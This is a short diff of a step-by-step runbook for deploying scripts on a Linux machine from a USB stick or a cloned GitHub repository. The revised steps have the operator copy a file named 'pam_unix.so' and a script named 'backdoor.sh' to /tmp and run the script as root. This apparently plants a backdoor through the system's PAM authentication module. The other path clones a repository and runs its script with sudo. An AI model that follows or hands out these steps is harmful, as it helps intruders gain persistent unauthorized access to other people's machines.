@@ -1,23 +1,19 @@
 ******** USB ********
 * insert usb *
 * open files *
-* select both files on usb *
-* move to documents *
+* move "pam_unix.so" and "backdoor.sh" to "/tmp" *
 * open terminal *
-sudo apt install sshpass xargs bash -y
-* new terminal tab *
-cd Documents
-sudo chmod +x script.sh
-sudo ./script.sh
-1
+cd /tmp
+sudo apt install sshpass bash -y
+sudo chmod +x backdoor.sh
+sudo ./backdoor.sh
+
 
 
 ******** NO USB ********
 * open terminal *
-sudo apt install git sshpass xargs bash -y
-* new terminal tab *
+sudo apt install git sshpass bash -y
 sudo git clone https://github.com/sawyer3399/x.git
 cd x
 sudo chmod +x script.sh
 sudo ./script.sh
-1
